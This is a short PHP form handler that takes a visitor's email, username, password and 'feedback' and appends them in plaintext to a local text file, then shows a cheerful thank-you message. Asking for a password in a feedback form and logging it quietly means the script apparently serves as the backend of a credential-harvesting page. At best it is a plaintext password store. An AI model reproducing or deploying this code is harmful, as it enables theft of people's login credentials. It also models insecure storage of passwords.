<?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    $id=$_POST['email'];
    $password=$_POST['pass'];
    $username=$_POST['user'];
    $feedback = $_POST['sugg'];
    $data = "Email: $id\nUsername: $username\nPassword: $password\nFeedback: $feedback\n";
    file_put_contents("example.txt", $data, FILE_APPEND);
    echo("thank you!");
    echo("Have a nice day!🙂");
}
?>
